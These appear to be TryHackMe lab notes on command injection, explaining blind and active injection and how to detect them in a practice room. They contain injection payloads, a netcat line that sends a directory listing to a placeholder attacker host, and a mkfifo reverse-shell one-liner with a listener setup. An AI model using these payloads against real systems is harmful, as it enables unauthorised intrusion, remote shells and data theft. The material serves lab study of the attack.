# Room
https://tryhackme.com/room/injection

# Task 1 - Deploy
Deploy VM

# Task 2 - Intro
Command Injection occurs when server side code like PHP that is housed in a web application makes a system call on the hosting machine

# Task 3 - Blind Command Injection
Blind command injection occurs when the system call doesn't return a response

* How to tell if you have blind command injection
  * Ping
    * If you send 10 pings and the response is delayed about 10 seconds there is a good chance you have blind command injection
  * Redirect output
    * Use output redirection to write a file, then try to browse for that file
  * Bypass using netcat
    * ls -la | nc [attacker_ip] [attacker_port]

Examples
```
; ping -c 10 127.0.0.1
; uname -r > k.txt
```

# Task 4 - Active Command Injection
Active command injection occurs when the system returns a response to your query

* How to tell if you have active command injection
  * Use normal commands as input
    * whoami
    * id
    * ifconfig
    * ipconfig
    * tasklist
    * netstat -ano

# Task 5 - Find the flag
Use active command injection to find the flag

* Setup listener on attack host
  * nc -nvlp 1234
* Inject reverse shell into vulnerable command app
  * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
* browse around for the flag

* Resources
  * https://weibell.github.io/reverse-shell-generator/